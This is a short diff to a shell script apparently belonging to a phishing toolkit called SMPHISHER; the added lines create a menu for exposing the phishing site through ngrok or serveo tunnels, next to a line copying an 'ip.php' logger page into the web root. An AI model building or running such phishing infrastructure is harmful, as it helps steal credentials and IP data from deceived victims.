@@ -144,6 +144,19 @@ cp -f sites/ip.php .pd/www/
 
 def_tunnel_menu="2"
 figlet SMPHISHER
+echo -e $red "[01] NGROK.IO "
+echo -e $red "[02] SERVEO "
+read -p "SELECT OPTION " tunnel_menu
+
+if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
+start_ngrok
+elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
+start_serveo
+
+else
+echo -e $red INVALID OPTION TRY AGAIN
+sleep 1
+menu
 fi
 
 start_ngrok() {
